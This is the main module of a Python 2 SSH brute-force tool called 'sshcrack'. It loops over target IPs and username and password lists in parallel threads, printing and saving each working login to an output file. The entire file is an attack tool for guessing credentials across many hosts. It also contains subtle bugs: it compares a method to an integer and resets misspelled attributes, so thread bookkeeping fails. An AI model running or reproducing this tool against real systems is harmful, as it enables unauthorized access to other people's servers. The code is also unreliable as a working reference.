#!/usr/bin/env python
#encoding=utf-8
#sshcrack by daige
#主模块

from sys        import exit
from optparse   import OptionParser
from SSHConnect import *
from Banner     import *
from FileParser import *
import  time


class SSHCrack():
    
    def __init__(self):
        self.targetIp =''
        self.targetIps=[]
        self.targetPort = 0
        self.usernames = []
        self.passwords = []
        self.connections = []
        self.amountOfThreads = 0
        self.currentThreadCount = 0
        self.timeoutTime = 0
        self.singleMode = False
        self.version = 'v1.0'

    def startUp(self):
        showBanner();
        
        parser = OptionParser('Usage:%prog -i[I] <target host[s]> -u[U] <username[s]> -p[P] <password[s]>')

        parser.add_option('-i',dest='targetIp',type='string',help ='target ip')
        parser.add_option('-I',dest='targetIpFile',type='string',help='targetip file')

        parser.add_option('-d',dest='targetPort',type='int',help='target port',default = 22)

        parser.add_option('-u',dest='username',type='string',help='username')
        parser.add_option('-U',dest='usernameFile',type='string',help='username file')

        parser.add_option('-p',dest='password',type='string',help='password')
        parser.add_option('-P',dest='passwordFile',type='string',help='password file')

        parser.add_option('-t',dest='timeoutTime',type='int',help='timeout time',default=10)

        parser.add_option('-n',dest='threads',type='int',help='amount of threads',default=10)

        parser.add_option('-o',dest='outfile',type='string',help='outfile name',default='result.txt')

        parser.add_option('-v',dest='version',type='string',help='show version')

        (options,args) = parser.parse_args()
    

        if( options.username or options.usernameFile) and (options.password or options.passwordFile):
            if options.targetIp and not options.targetIpFile:
                self.singleMode = True
                self.singleTarget(options)
            elif not options.targetIp and options.targetIpFile:
                self.singleTarget(options)
            else:
                parser.print_help()
                exit(0)
        else:
            parser.print_help()
            exit(0)

    def singleTarget(self,options):
        if options.targetIp and not options.targetIpFile:
            self.targetIp = options.targetIp
        else:
           self.targetIps = fileToList(options.targetIpFile)

        self.targetPort = options.targetPort
        
        if options.username:
            self.usernames.append(options.username)
        else:
            self.usernames =fileToList(options.usernameFile)
        
        if options.password:
            self.passwords.append(options.password)
        else:
            self.passwords =fileToList(options.passwordFile)

        self.amountOfThreads = options.threads
        self.timeoutTime = options.timeoutTime
        self.outfile = options.outfile
        self.version = options.version
        self.showStartInfo(options)
        self.crack()
        
    def showStartInfo(self,options):
        print "[*]Starte cracking..."

        if self.singleMode:
            print "[*]IP= %s " % self.targetIp
        else:
            print "[*]loaded %d targetips from %s  " % (len(self.targetIps),options.targetIpFile)
        
        print "[*]loaded %d usernames from  %s " % (len(self.usernames),options.usernameFile)
        print "[*]loaded %s passwords from  %s " % (len(self.passwords),options.passwordFile)
    
    def createConnect(self,username,password,targetIp,targetPort,timeoutTime):
        connection = SSHConnect(username,password,targetIp,targetPort,timeoutTime)
        connection.connect()
        connection.start()
        self.connections.append(connection)
        self.currentThreadCount += 1
        print "[*]Testing Target: %s username: %s  password: %s success: %d " % (targetIp,username,password,connection.status)

    def crack(self):
        if self.singleMode:
            for username in self.usernames:
                for password in self.passwords:
                    self.createConnect(username,password,self.targetIp,self.targetPort,self.timeoutTime)
                    if self.currentThreadCount == self.amountOfThreads:
                        self.currentThreadResults()
            self.currentThreadResults()
            self.completed()
        else:
            for ip in self.targetIps:
                for username in self.usernames:
                    for password in self.passwords:
                        self.createConnect(username,password,ip,self.targetPort,self.timeoutTime)
                        if self.currentThreadResults == self.amountOfThreads:
                            self.currentThreadResults()
            self.currentThreadResults()
            self.completed()

    
    def currentThreadResults(self):
        if self.outfile != " ":
            appendLineToFile('[+]'+time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()),self.outfile)
        for connection in self.connections:
            connection.join()
            if connection.status == 1:
                print "[#] TargetIp: %s "  % connection.targetIp
                print "[#] Username: %s "  % connection.userName
                print "[#] Password: %s "  % connection.passWord
                if self.outfile != " ":
                    appendLineToFile("ip: %s username: %s password: %s " % (connection.targetIp,connection.userName,connection.passWord), self.outfile)
                    appendLineToFile(" ",self.outfile)
                if self.singleMode:
                    self.completed()
                else:
                    pass
        self.clearOldThreads()

    def clearOldThreads(self):
        self.connection = []
        self.threads = 0

    def completed(self):
        print "[*] Crack Completed"
        exit(0)

if __name__ == '__main__':
    sshcrack = SSHCrack()
    sshcrack.startUp()
